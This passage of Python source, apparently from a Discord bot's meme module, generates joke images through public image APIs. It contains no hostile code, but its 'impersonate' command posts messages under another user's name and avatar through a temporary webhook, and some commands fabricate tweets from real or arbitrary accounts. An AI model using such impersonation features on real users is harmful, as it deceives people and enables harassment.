        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='FML', description=f'{text}',timestamp=embed_timestamp())
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="trumptweet <Tweet>", description="Generates a Trump Tweet with a custom message")
    async def trumptweet(ctx, *, tweet: str):
        
        request = requests.get(f'https://nekobot.xyz/api/imagegen?type=trumptweet&text={urllib.parse.quote(tweet)}')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Trump Tweet',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="tweet <Username> <Tweet>", description="Tweets a message with a specific username")
    async def tweet(ctx, name, *, message: str):
        request = requests.get(f'https://nekobot.xyz/api/imagegen?type=tweet&username={name}&text={urllib.parse.quote(message)}')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Tweet',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="eject <Impostor(true/false)> <Crewmate(red,lime,blue)> <User>", description="Eject an user")
    async def eject(ctx, impostor: bool, crewmate: str, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Eject',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/ejected?name={urllib.parse.quote(user.name)}&impostor={impostor}&crewmate={crewmate}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="carreverse <Text>", description="Car reverse meme")
    async def carreverse(ctx, *, text):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Car Reverse',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/carreverse?text={urllib.parse.quote(text)}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="water <Text>", description="Water meme")
    async def water(ctx, *, text):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Water',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/water?text={urllib.parse.quote(text)}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="emergencymeeting <Text>", description="Emergency meeting meme")
    async def emergencymeeting(ctx, *, text):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Emergency Meeting',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/emergencymeeting?text={urllib.parse.quote(text)}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="iamspeed <User>", description="I am speed meme")
    async def iamspeed(ctx, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'I am speed',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/iamspeed?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="drip <User>", description="Drip goku meme")
    async def drip(ctx, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Drip',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/drip?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="firsttime <User>", description="First time meme")
    async def firsttime(ctx, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'First Time',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/firsttime?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="heaven <User>", description="Heaven meme")
    async def heaven(ctx, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Heaven',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/heaven?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="dockofshame <User>", description="Dock of Shame image")
    async def dockofshame(ctx, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Dock of Shame',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/dockofshame?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="icanmilkyou <User 1> <User 2>", description="I can milk you meme")
    async def icanmilkyou(ctx, user1: discord.User, user2: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'I can milk you',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/icanmilkyou?user1={urllib.parse.quote(str(user1.avatar_url).replace('webp', 'png'))}&user2={urllib.parse.quote(str(user2.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="batmanslap <User(Batman)> <User(Robin)> <Text 1> <Text 2>", description="Batman slap meme")
    async def batmanslap(ctx, batman: discord.User, robin: discord.User, text1: str, text2: str):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Batman slap',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/batmanslap?batman={urllib.parse.quote(str(batman.avatar_url).replace('webp', 'png'))}&robin={urllib.parse.quote(str(robin.avatar_url).replace('webp', 'png'))}&text1={urllib.parse.quote(text1)}&text2={urllib.parse.quote(text2)}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="distractedbf <User(Boyfriend)> <User(Woman)> <User(Girlfriend)>", description="Distracted boyfriend meme ")
    async def distractedbf(ctx, boyfriend: discord.User, woman: discord.User, girlfriend: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Distracted Boyfriend',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/distractedbf?boyfriend={urllib.parse.quote(str(boyfriend.avatar_url).replace('webp', 'png'))}&woman={urllib.parse.quote(str(woman.avatar_url).replace('webp', 'png'))}&girlfriend={urllib.parse.quote(str(girlfriend.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="stonks <User>", description="Stonks meme")
    async def stonks(ctx, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Stonks',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/stonks?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="notstonks <User>", description="Not stonks meme")
    async def notstonks(ctx, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Not Stonks',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/stonks?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}&notstonks=true")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="tableflipimg <User>", description="Table flip meme")
    async def tableflipimg(ctx, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Table Flip',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/tableflip?user={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="npc <Text 1> <Text 2>", description="NPC meme")
    async def npc(ctx, text1: str, text2: str):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'NPC',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/npc?text1={urllib.parse.quote(text1)}&text2={urllib.parse.quote(text2)}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="wide <User>", description="Wide avatar")
    async def wide(ctx, user: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Wide',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/wide?image={urllib.parse.quote(str(user.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="womanyellingatcat <User(Woman)> <User(Cat)>", description="Woman yelling at cat meme")
    async def womanyellingatcat(ctx, woman: discord.User, cat: discord.User):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Woman Yelling At Cat',timestamp=embed_timestamp())
        embed.set_image(url=f"https://vacefron.nl/api/womanyellingatcat?woman={urllib.parse.quote(str(woman.avatar_url).replace('webp', 'png'))}&cat={urllib.parse.quote(str(cat.avatar_url).replace('webp', 'png'))}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="impersonate <User> <Message>", description="Impersonates a user using a webhook")
    async def impersonate(ctx, user: discord.User, *, message: str):
        webhook = await ctx.channel.create_webhook(name=user.name)
        await webhook.send(message, username=user.name, avatar_url=user.avatar_url)
        await webhook.delete()
                
    @React.command(usage="changemymind <Text>", description="Generates Change my Mind image")
    async def changemymind(ctx, *, message: str):
        request = requests.get(f'https://nekobot.xyz/api/imagegen?type=changemymind&text={urllib.parse.quote(message)}')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Change my mind',timestamp=embed_timestamp())
        embed.set_image(url=link)
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="phcomment <User> <Text>", description="Generates a PornHub comment with a custom message")
    async def phcomment(ctx, user: discord.User, *, text: str):
        
        image_url = str(user.avatar_url).replace(".webp", ".png")
        request = requests.get(f'https://nekobot.xyz/api/imagegen?type=phcomment&image={image_url}&username={urllib.parse.quote(user.name)}&text={urllib.parse.quote(text)}')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'PornHub Comment',timestamp=embed_timestamp())
        embed.set_image(url=link)
